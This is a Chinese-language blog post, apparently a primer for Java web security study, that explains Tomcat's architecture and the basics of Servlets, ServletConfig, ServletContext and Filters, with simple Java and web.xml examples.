<!DOCTYPE html>
<html lang="en">
    <head>
  <!-- 元数据 -->
  <meta charset="utf-8">
  <link rel="icon" href="/images/icon.jpg">
  
  <title>java安全-tomcat | QWQ0QWQ&#39;s blog</title>
  
  <meta name="author" content="QWQ0QWQ" />
  <meta http-equiv="Cache-Control" content="no-transform" />
  <meta http-equiv="Cache-Control" content="no-siteapp" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="robots" content="index,follow" />
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
  <meta name="format-detection" content="telphone=no, email=no" />
  
    <meta name="keywords" content="java安全s" />
  
  <meta name="description" content="java安全-tomcat什么是tomcatTomcat是由Apache软件基金会属下Jakarta项目开发的Servlet容器，实现了对Servlet和JavaServer Page（JSP）的支持。由于Tomcat本身也内含了HTTP服务器，因此也可以视作单独的Web服务器。 默认端口：8080 简单来说，Tomcat可以看成是Web服务器+Servlet容器，如下图  Tomcat能够通过C">
<meta property="og:type" content="article">
<meta property="og:title" content="java安全-tomcat">
<meta property="og:url" content="https://qwq0qwq.github.io/2024/02/11/java%E5%AE%89%E5%85%A8-tomcat/index.html">
<meta property="og:site_name" content="QWQ0QWQ&#39;s blog">
<meta property="og:description" content="java安全-tomcat什么是tomcatTomcat是由Apache软件基金会属下Jakarta项目开发的Servlet容器，实现了对Servlet和JavaServer Page（JSP）的支持。由于Tomcat本身也内含了HTTP服务器，因此也可以视作单独的Web服务器。 默认端口：8080 简单来说，Tomcat可以看成是Web服务器+Servlet容器，如下图  Tomcat能够通过C">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://qwq0qwq.github.io/images/icon.jpg">
<meta property="article:published_time" content="2024-02-11T07:42:25.000Z">
<meta property="article:modified_time" content="2024-02-11T07:43:27.161Z">
<meta property="article:author" content="QWQ0QWQ">
<meta property="article:tag" content="java安全s">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://qwq0qwq.github.io/images/icon.jpg">
  
  <!-- 站点验证相关 -->
  
    
    
    
  
  <!-- 样式表文件 -->
  <link rel="stylesheet" id="kratos-css" href="/css/kratosr.min.css" media="all"></script>
  
    <link rel="stylesheet" id="darkmode-css" href="/css/kr-color-dark.min.css" media="(prefers-color-scheme: dark)"></script>
    <script src="/js/kr-dark.min.js"></script>
  
  
    <link rel="stylesheet" id="highlight-css" href="/css/highlight/night-eighties.min.css" media="all"></script>
  
  <link rel="stylesheet" id="fontawe-css" href="/vendors/font-awesome@4.7.0/css/font-awesome.min.css" media="all"></script>
  <link rel="stylesheet" id="nprogress-css" href="/vendors/nprogress@0.2.0/nprogress.css" media="all"></script>
  
  
    <link rel="stylesheet" href="/vendors/aplayer@1.10.1/dist/APlayer.min.css"></script>
  
  
    <link rel="stylesheet" href="/vendors/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css"></script>
  
  <!-- 不得不预先加载的一些JS文件 -->
  <script src="/vendors/jquery@3.6.0/dist/jquery.min.js"></script>
  
    <script src="/vendors/qrcode_js@1.0.0/qrcode.min.js"></script>
  
  
  <style>
    
    
      @media(min-width:768px) {
        body.custom-background {
          background-image: url('/images/cover1.jpg');
        }
      }
    
  </style>
  
<meta name="generator" content="Hexo 6.3.0"></head>


    <body class="custom-background">
        <div id="kratos-wrapper">
    <div id="kratos-page">
        <div id="kratos-header">
            <header id="kratos-desktop-topnav" class="kratos-topnav">
                <div class="container">
                    <div class="nav-header">
                        <nav id="kratos-menu-wrap">
                            <ul id="kratos-primary-menu" class="sf-menu">
                                
                                    
                                    
                                
                            </ul>
                        </nav>
                    </div>
                </div>
            </header>
            <header id="kratos-mobile-topnav" class="kratos-topnav">
                <div class="container">
                    <div class="color-logo"><a href="/">QWQ0QWQ&#39;s blog</a></div>
                    <div class="nav-toggle">
                        <a class="kratos-nav-toggle js-kratos-nav-toggle">
                            <i></i>
                        </a>
                    </div>
                </div>
            </header>
        </div>
        <div class="kratos-start kratos-hero-2">
            <!-- <div class="kratos-overlay"></div> -->
            <div class="kratos-cover kratos-cover-2 text-center">
                <div class="desc desc2 animate-box">
                    <a href="/">
                        <h2>QWQ0QWQ&#39;s blog</h2> <br />
                        <span></span>
                    </a>
                </div>
            </div>
        </div>

        <div id="kratos-blog-post">
            <div class="container">
                <div id="main" class="row">
                    

        

            <section class="col-md-8">

        

            <article itemscope itemtype="https://schema.org/Article">
    
    <link itemprop="mainEntityOfPage" href="https://qwq0qwq.github.io/2024/02/11/java%E5%AE%89%E5%85%A8-tomcat/">
    <div class="kratos-hentry kratos-post-inner clearfix">
        <header class="kratos-entry-header">
            
                <h1 class="kratos-entry-title text-center" itemprop="name headline">java安全-tomcat</h1>
            
            
            <ul class="kratos-post-meta text-center">
                <li><time datetime="2024-02-11T07:42:25.000Z" itemprop="datePublished"><i class="fa fa-calendar"></i> 2024-02-11</time></li>
                <li itemprop="author" itemscope itemtype="https://schema.org/Person">
                    <i class="fa fa-user"></i> 作者 <span itemprop="name">QWQ0QWQ</span>
                </li>
                
                    <li>
                        <i class="fa fa-edit"></i> 
                        
                        
                            ~24.69K
                        
                        字
                    </li>
                
                
            </ul>
        </header>
        <div class="kratos-post-content">
            
            <div id="expire-alert" class="alert alert-warning hidden" role="alert">
                <div class="icon"><i class="fa fa-warning"></i></div>
                <div class="text"><p>本文最后编辑于 <time datetime="1707637407161"></time> 前，其中的内容可能需要更新。</p></div>
            </div>
            
            
            
            <hr />
            <div itemprop="articleBody"><h1 id="java安全-tomcat"><a href="#java安全-tomcat" class="headerlink" title="java安全-tomcat"></a>java安全-tomcat</h1><h2 id="什么是tomcat"><a href="#什么是tomcat" class="headerlink" title="什么是tomcat"></a>什么是tomcat</h2><p><strong>Tomcat</strong>是由Apache软件基金会属下Jakarta项目开发的Servlet容器，实现了对Servlet和JavaServer Page（JSP）的支持。由于Tomcat本身也内含了HTTP服务器，因此也可以视作单独的Web服务器。</p>
<p>默认端口：8080</p>
<p>简单来说，Tomcat可以看成是Web服务器+Servlet容器，如下图</p>
<p><img src="https://goodapple.top/wp-content/uploads/2022/04/Tomcat-1.png" alt="img"></p>
<p>Tomcat能够通过Connector组件接收并解析HTTP请求，然后将一个<code>ServletRequest</code>对象发送给Container处理。容器处理完之后会将响应封装成<code>ServletRespone</code>返回给Connector，然后Connector再将<code>ServletRespone</code>解析为HTTP响应文本格式发送给客户端，至此Tomcat就完成了一次网络通信。</p>
<h2 id="tomcat架构"><a href="#tomcat架构" class="headerlink" title="tomcat架构"></a>tomcat架构</h2><p><img src="https://goodapple.top/wp-content/uploads/2022/04/Tomcat-2.png" alt="img"></p>
<p>Tomcat架构图</p>
<p>可以看到Tomcat Server大致可以分为三个组件，Service、Connector、Container</p>
<h3 id="Service"><a href="#Service" class="headerlink" title="Service"></a>Service</h3><p>其中一个Tomcat Server可以包含多个Service，比如Tomcat默认的Service服务Catalina。每一个Service都是独立的，他们共享一个JVM以及系统类库，并且一个Service负责维护多个Connector和一个Container。</p>
<h3 id="Connector"><a href="#Connector" class="headerlink" title="Connector"></a>Connector</h3><p>Connector用于连接Service和Container，解析客户端的请求并转发到Container，以及转发来自Container的响应。每一种不同的Connector都可以处理不同的请求协议，包括HTTP&#x2F;1.1、HTTP&#x2F;2、AJP等等。</p>
<h3 id="Container"><a href="#Container" class="headerlink" title="Container"></a>Container</h3><p>Tomcat的Container包含四种子容器：<code>Engine</code>、<code>Host</code>、<code>Context</code>和<code>Wrapper</code>，在Tomcat源码中我们可以清晰地看到各容器之间的继承关系</p>
<p><img src="https://goodapple.top/wp-content/uploads/2022/04/%E5%9B%BE%E7%89%87-71.png" alt="img"></p>
<p>其中，一个Container对应一个Engine，一个Engine可以包含多个Host，一个Host可以包含多个Context，Context又包含多个Wrapper，各子容器的功能如下</p>
<h4 id="Engine"><a href="#Engine" class="headerlink" title="Engine"></a>Engine</h4><p>可以看成是容器对外提供功能的入口，每个Engine是Host的集合，用于管理各个Host。</p>
<h4 id="Host"><a href="#Host" class="headerlink" title="Host"></a>Host</h4><p>可以看成一个<code>虚拟主机</code>，一个Tomcat可以支持多个虚拟主机。</p>
<h4 id="Context"><a href="#Context" class="headerlink" title="Context"></a>Context</h4><p>又叫做上下文容器，我们可以将其看成一个Web应用，每个Host里面可以运行多个Web应用。同一个Host里面不同的Context，其contextPath必须不同，默认Context的contextPath为空格(“”)或斜杠(&#x2F;)。</p>
<h4 id="Wrapper"><a href="#Wrapper" class="headerlink" title="Wrapper"></a>Wrapper</h4><p>是对Servlet的抽象和包装，每个Context可以有多个Wrapper，用于支持不同的Servlet每个Wrapper实例表示一个具体的Servlet定义，Wrapper主要负责管理 Servlet ，包括的 Servlet 的装载、初始化、执行以及资源回收。</p>
<p>可以用一张图来表示请求在Container中的解析过程</p>
<p><img src="https://goodapple.top/wp-content/uploads/2022/04/%E5%9B%BE%E7%89%87-72.png" alt="img"></p>
<p>以上的映射信息通过通过Mapper组件来关联。Mapper组件保存了Web应用的配置信息，容器组件与访问路径的映射关系等。</p>
<h2 id="tomcat启动过程"><a href="#tomcat启动过程" class="headerlink" title="tomcat启动过程"></a>tomcat启动过程</h2><p><img src="https://ask.qcloudimg.com/http-save/yehe-7698324/8r9csgdlnh.png" alt="img"></p>
<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1687355">https://cloud.tencent.com/developer/article/1687355</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/yuxiangaaaaa/article/details/72867037">https://blog.csdn.net/yuxiangaaaaa/article/details/72867037</a></p>
<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1687354">https://cloud.tencent.com/developer/article/1687354</a></p>
<h2 id="JavaWeb三大组件"><a href="#JavaWeb三大组件" class="headerlink" title="JavaWeb三大组件"></a>JavaWeb三大组件</h2><h3 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h3><p>Servlet是用来处理客户端请求的动态资源，当Tomcat接收到来自客户端的请求时，会将其解析成<code>RequestServlet</code>对象并发送到对应的Servlet上进行处理。</p>
<h4 id="Servlet的生命周期"><a href="#Servlet的生命周期" class="headerlink" title="Servlet的生命周期"></a>Servlet的生命周期</h4><p>Servlet的生命周期分为如下五个阶段</p>
<ul>
<li>加载：当Tomcat第一次访问Servlet的时候，Tomcat会负责创建Servlet的实例</li>
<li>初始化：当Servlet被实例化后，Tomcat会调用<code>init()</code>方法初始化这个对象</li>
<li>处理服务：当浏览器访问Servlet的时候，Servlet 会调用<code>service()</code>方法处理请求</li>
<li>销毁：当Tomcat关闭时或者检测到Servlet要从Tomcat删除的时候会自动调用<code>destroy()</code>方法，让该实例释放掉所占的资源。一个Servlet如果长时间不被使用的话，也会被Tomcat自动销毁</li>
<li>卸载：当Servlet调用完<code>destroy()</code>方法后，等待垃圾回收。如果有需要再次使用这个Servlet，会重新调用<code>init()</code>方法进行初始化操作</li>
</ul>
<p>只要访问Servlet，<code>service()</code>就会被调用。<code>init()</code>只有第一次访问Servlet的时候才会被调用。 <code>destroy()</code>只有在Tomcat关闭的时候才会被调用。因此我们主要的业务逻辑代码是写在<code>service()</code>函数中的。</p>
<p><img src="http://c.biancheng.net/uploads/allimg/210616/14224J192-0.png" alt="Servlet 生命周期"></p>
<h4 id="Servlet使用示例"><a href="#Servlet使用示例" class="headerlink" title="Servlet使用示例"></a>Servlet使用示例</h4><p>想要编写一个自己的Servlet，就必须要继承Servlet接口并实现如下五个方法</p>
<p><img src="https://goodapple.top/wp-content/uploads/2022/04/%E5%9B%BE%E7%89%87-73.png" alt="img"></p>
<p>但每次需要编写Servlet的时候都要重写五个方法，这样未免太繁琐。因此Tomcat已经帮我们封装好了两个类，分别是<code>GenericServlet</code>类和<code>HttpServlet</code>类。</p>
<p><img src="http://c.biancheng.net/uploads/allimg/210616/14021Mc6-0.png" alt="Servlet 关系图"></p>
<p>GenericServlet抽象类实现了 Servlet 接口，并对 Servlet 接口中除service()方法外的其它四个方法进行了简单实现。如果我们通过继承GenericServlet类创建来Servlet，只需要重写<code>service()</code>方法即可。但正如其名，GenericServlet抽象类是一个通用的Servlet类，并不是针对某种应用场景而设计的，因此我们在处理HTTP请求的时候需要手动实现对HTTP请求的解析和封装。</p>
<p>HttpServlet是GenericServlet的子类，它在GenericServlet的基础上专门针对HTTP协议进行了处理。其针对每一种HTTP请求都设置了一种处理方法。当我们在使用HttpServlet类的时候，只需要根据HTTP请求类型重写相应的处理方法即可</p>
<p><img src="https://goodapple.top/wp-content/uploads/2022/04/%E5%9B%BE%E7%89%87-74.png" alt="img"></p>
<p>下面我就以HttpServlet为例，编写一个自己的Servlet</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">package Servlet;</span><br><span class="line"> </span><br><span class="line">import javax.servlet.ServletException;</span><br><span class="line">import javax.servlet.annotation.WebServlet;</span><br><span class="line">import javax.servlet.http.HttpServlet;</span><br><span class="line">import javax.servlet.http.HttpServletRequest;</span><br><span class="line">import javax.servlet.http.HttpServletResponse;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.PrintWriter;</span><br><span class="line"> </span><br><span class="line">@WebServlet(&quot;/hello&quot;)</span><br><span class="line">public class MyServlet extends HttpServlet &#123;</span><br><span class="line">    @Override</span><br><span class="line">    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;</span><br><span class="line">        String parameter = req.getParameter(&quot;name&quot;);</span><br><span class="line">        PrintWriter writer = resp.getWriter();</span><br><span class="line">        writer.write(&quot;Hello &quot;+parameter+&quot;!&quot;);</span><br><span class="line">        writer.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里我们使用注解来注册Servlet</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">@WebServlet(&quot;/hello&quot;)</span><br><span class="line">public class MyServlet extends HttpServlet &#123;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当然我们也可以通过手动配置web.xml文件来注册Servlet，这种方式虽然繁琐，但是便于管理各Servlet。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;servlet&gt;</span><br><span class="line">  &lt;servlet-name&gt;MyServlet&lt;/servlet-name&gt;</span><br><span class="line">  &lt;servlet-class&gt;Servlet.MyServlet&lt;/servlet-class&gt;</span><br><span class="line">  &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;</span><br><span class="line">&lt;/servlet&gt;</span><br><span class="line">&lt;servlet-mapping&gt;</span><br><span class="line">  &lt;servlet-name&gt;MyServlet&lt;/servlet-name&gt;</span><br><span class="line">  &lt;url-pattern&gt;/hello&lt;/url-pattern&gt;</span><br><span class="line">&lt;/servlet-mapping&gt;</span><br></pre></td></tr></table></figure>

<p>配置Tomcat，添加好相应的war包</p>
<p><img src="https://goodapple.top/wp-content/uploads/2022/04/%E5%9B%BE%E7%89%87-78.png" alt="img"></p>
<p>访问<code>http://localhost:8081/Tomcat_Servlet_war/hello?name=Feng</code>，结果如下</p>
<p><img src="https://goodapple.top/wp-content/uploads/2022/04/%E5%9B%BE%E7%89%87-76.png" alt="img"></p>
<h4 id="ServletConfig和ServletContext"><a href="#ServletConfig和ServletContext" class="headerlink" title="ServletConfig和ServletContext"></a>ServletConfig和ServletContext</h4><h5 id="ServletConfig"><a href="#ServletConfig" class="headerlink" title="ServletConfig"></a>ServletConfig</h5><p>当Servlet容器初始化一个Servlet时，会为这个Servlet创建一个ServletConfig对象，并将 ServletConfig 对象作为参数传递给Servlet。ServletConfig对象封装了Servlet的一些独有参数信息，因此一个Servlet只能对应一个ServletConfig。</p>
<p>下面是ServletConfig的使用示例</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">package Servlet;</span><br><span class="line"> </span><br><span class="line">import javax.servlet.ServletConfig;</span><br><span class="line">import javax.servlet.ServletException;</span><br><span class="line">import javax.servlet.annotation.WebServlet;</span><br><span class="line">import javax.servlet.http.HttpServlet;</span><br><span class="line">import javax.servlet.http.HttpServletRequest;</span><br><span class="line">import javax.servlet.http.HttpServletResponse;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.PrintWriter;</span><br><span class="line"> </span><br><span class="line">@WebServlet(&quot;/config&quot;)</span><br><span class="line">public class Config_Servlet extends HttpServlet &#123;</span><br><span class="line"> </span><br><span class="line">    @Override</span><br><span class="line">    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;</span><br><span class="line">        //设置响应编码</span><br><span class="line">        resp.setContentType(&quot;text/html; charset=UTF-8&quot;);</span><br><span class="line">        //获取ServletConfig</span><br><span class="line">        ServletConfig servletConfig = getServletConfig();</span><br><span class="line">        //获取Servlet名称</span><br><span class="line">        String name = servletConfig.getServletName();</span><br><span class="line">        PrintWriter writer = resp.getWriter();</span><br><span class="line">        writer.write(&quot;Servlet名称为：&quot;+name);</span><br><span class="line">        writer.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://goodapple.top/wp-content/uploads/2022/04/%E5%9B%BE%E7%89%87-77.png" alt="img"></p>
<h5 id="ServletContext"><a href="#ServletContext" class="headerlink" title="ServletContext"></a>ServletContext</h5><p>Servlet 容器启动时，会为每个 Web 应用（webapps 下的每个目录都是一个 Web 应用）创建一个唯一的 ServletContext 对象，该对象一般被称为“Servlet 上下文”。</p>
<p>由于一个Web应用可以包含多个Servlet，因此ServletContext可以看作是一个Web应用中各Servlet的共享资源。不同 Servlet 之间可以通过ServletContext对象实现数据通讯，因此ServletContext对象也被称为Context域对象。</p>
<p>ServletContext 对象的生命周期从 Servlet 容器启动时开始，到容器关闭或应用被卸载时结束。</p>
<p>通过ServletContext可以获取Web应用中一些共享的资源。下面我们使用ServletContext来获取上下文初始化参数</p>
<p>首先在web.xml中配置一个上下文初始化参数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;web-app&gt;</span><br><span class="line">  &lt;display-name&gt;Archetype Created Web Application&lt;/display-name&gt;</span><br><span class="line">  //配置上下文初始化参数name</span><br><span class="line">  &lt;context-param&gt;</span><br><span class="line">    &lt;param-name&gt;name&lt;/param-name&gt;</span><br><span class="line">    &lt;param-value&gt;Feng&lt;/param-value&gt;</span><br><span class="line">  &lt;/context-param&gt;</span><br><span class="line">  &lt;context-param&gt;</span><br><span class="line">    &lt;param-name&gt;age&lt;/param-name&gt;</span><br><span class="line">    &lt;param-value&gt;18&lt;/param-value&gt;</span><br><span class="line">  &lt;/context-param&gt;</span><br><span class="line">&lt;/web-app&gt;</span><br><span class="line">package Servlet;</span><br><span class="line"> </span><br><span class="line">import javax.servlet.ServletContext;</span><br><span class="line">import javax.servlet.ServletException;</span><br><span class="line">import javax.servlet.annotation.WebServlet;</span><br><span class="line">import javax.servlet.http.HttpServlet;</span><br><span class="line">import javax.servlet.http.HttpServletRequest;</span><br><span class="line">import javax.servlet.http.HttpServletResponse;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.PrintWriter;</span><br><span class="line">import java.util.Enumeration;</span><br><span class="line"> </span><br><span class="line">@WebServlet(&quot;/context&quot;)</span><br><span class="line">public class Context_Servlet extends HttpServlet &#123;</span><br><span class="line">    @Override</span><br><span class="line">    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;</span><br><span class="line">        resp.setContentType(&quot;text/html; charset=UTF-8&quot;);</span><br><span class="line">        PrintWriter writer = resp.getWriter();</span><br><span class="line"> </span><br><span class="line">        ServletContext servletContext = getServletContext();</span><br><span class="line"> </span><br><span class="line">        Enumeration&lt;String&gt; initParamerNames = servletContext.getInitParameterNames();</span><br><span class="line">        while(initParamerNames.hasMoreElements())&#123;</span><br><span class="line">            String ParamerName = initParamerNames.nextElement();</span><br><span class="line">            String Paramer = servletContext.getInitParameter(ParamerName);</span><br><span class="line">            writer.write(ParamerName+&quot;的值为：&quot;+Paramer+&quot;&lt;br/&gt;&quot;);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        writer.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://goodapple.top/wp-content/uploads/2022/04/%E5%9B%BE%E7%89%87-79.png" alt="img"></p>
<h3 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h3><p>Filter用于拦截用户请求以及服务端的响应，能够在拦截之后对请求和响应做出相应的修改。Filter不是Servlet，不能直接访问，它能够对于Web应用中的资源（Servlet、JSP、静态页面等）做出拦截，从而实现一些相应的功能。下面是Filter在Server中的调用流程图</p>
<p><img src="http://c.biancheng.net/uploads/allimg/210702/1504236208-0.png" alt="Filter 流程图"></p>
<p>这种调用流程类似于设计模式中的“责任链模式”，对于不符合要求的资源进行拦截，而符合要求的资源使用<code>FilterChain.doFilter()</code>放行。下面是一个简单的Filter Servlet示例，这里我们同样使用注解方式进行配置</p>
<p>Hello_Servlet.java</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">package Filter;</span><br><span class="line"> </span><br><span class="line">import javax.servlet.ServletException;</span><br><span class="line">import javax.servlet.annotation.WebServlet;</span><br><span class="line">import javax.servlet.http.HttpServlet;</span><br><span class="line">import javax.servlet.http.HttpServletRequest;</span><br><span class="line">import javax.servlet.http.HttpServletResponse;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.PrintWriter;</span><br><span class="line"> </span><br><span class="line">@WebServlet(&quot;/hello&quot;)</span><br><span class="line">public class Hello_Servlet extends HttpServlet &#123;</span><br><span class="line">    @Override</span><br><span class="line">    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;</span><br><span class="line">        PrintWriter writer = resp.getWriter();</span><br><span class="line">        writer.write(&quot;Hello World!&quot;);</span><br><span class="line">        writer.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Hello_Filter1.java</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">package Filter;</span><br><span class="line"> </span><br><span class="line">import javax.servlet.*;</span><br><span class="line">import javax.servlet.annotation.WebFilter;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.PrintWriter;</span><br><span class="line"> </span><br><span class="line">@WebFilter(&quot;/hello&quot;)</span><br><span class="line">public class Hello_Filter1 implements Filter &#123;</span><br><span class="line"> </span><br><span class="line">    @Override</span><br><span class="line">    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException &#123;</span><br><span class="line">        response.setContentType(&quot;text/html; charset=UTF-8&quot;);</span><br><span class="line">        PrintWriter writer = response.getWriter();</span><br><span class="line">        writer.write(&quot;调用Filter1！&lt;/br&gt;&quot;);</span><br><span class="line">        chain.doFilter(request,response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Hello_Filter2.java</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">package Filter;</span><br><span class="line"> </span><br><span class="line">import javax.servlet.*;</span><br><span class="line">import javax.servlet.annotation.WebFilter;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.PrintWriter;</span><br><span class="line"> </span><br><span class="line">@WebFilter(&quot;/hello&quot;)</span><br><span class="line">public class Hello_Filter2 implements Filter &#123;</span><br><span class="line">    @Override</span><br><span class="line">    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException &#123;</span><br><span class="line">        PrintWriter writer = response.getWriter();</span><br><span class="line">        writer.write(&quot;调用Filter2！&lt;/br&gt;&quot;);</span><br><span class="line">        chain.doFilter(request,response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果如下</p>
<p><img src="https://goodapple.top/wp-content/uploads/2022/04/%E5%9B%BE%E7%89%87-80.png" alt="img"></p>
<h4 id="Filter的生命周期"><a href="#Filter的生命周期" class="headerlink" title="Filter的生命周期"></a>Filter的生命周期</h4><p>Filter的生命周期和Servlet一样，Filter的创建和销毁也是由WEB服务器负责。</p>
<ul>
<li>初始化阶段：init(FilterConfig)，初始化方法，只会在web应用程序启动时调用一次。</li>
<li>拦截和过滤阶段：doFilter(ServletRequest, ServletResponse, FilterChain)，完成实际的过滤操作。当客户请求访问与过滤器关联的URL的时候，Servlet过滤器将先执行doFilter方法。FilterChain参数用于访问后续过滤器</li>
<li>销毁阶段：destory()，销毁Filter，只会在当web应用移除或服务器停止时才调用一次来卸载Filter对象</li>
</ul>
<h4 id="FilterChain"><a href="#FilterChain" class="headerlink" title="FilterChain"></a>FilterChain</h4><p>我们知道，一个Servlet可以注册多个Filter，Web容器会将注册的多个Filter组合成一个“Filter链”，并按照一定的顺序依次执行各Filter的doFilter()方法。</p>
<p><img src="https://goodapple.top/wp-content/uploads/2022/04/Tomcat-4.png" alt="img"></p>
<p>FilterChain就是这样一个接口，其doFIiter()方法用于将本Filter处理完的Servlet资源交给下一个Filter处理。</p>
<p><img src="https://goodapple.top/wp-content/uploads/2022/04/%E5%9B%BE%E7%89%87-82.png" alt="img"></p>
<h4 id="Filter执行顺序"><a href="#Filter执行顺序" class="headerlink" title="Filter执行顺序"></a>Filter执行顺序</h4><p>Filter的注册方式不同，Filter的执行顺序也有所不同</p>
<ul>
<li>基于注解配置：按照类名的字符串比较规则比较，值小的先执行</li>
<li>使用web.xml配置：根据对应的Mapping的顺序组织，谁定义在上边谁就在前</li>
</ul>
<h4 id="FilterConfig"><a href="#FilterConfig" class="headerlink" title="FilterConfig"></a>FilterConfig</h4><p>和Servlet类似，由于Filter也有可能访问Servlet，所以Servlet 规范将代表 ServletContext 对象和 Filter 的配置参数信息都封装到一个称为 FilterConfig 的对象中。</p>
<p>FilterConfig接口则用于定义FilterConfig对象应该对外提供的方法，以便在 Filter的doFilter()方法中可以调用这些方法来获取 ServletContext 对象，以及获取在 web.xml 文件中的一些初始化参数。</p>
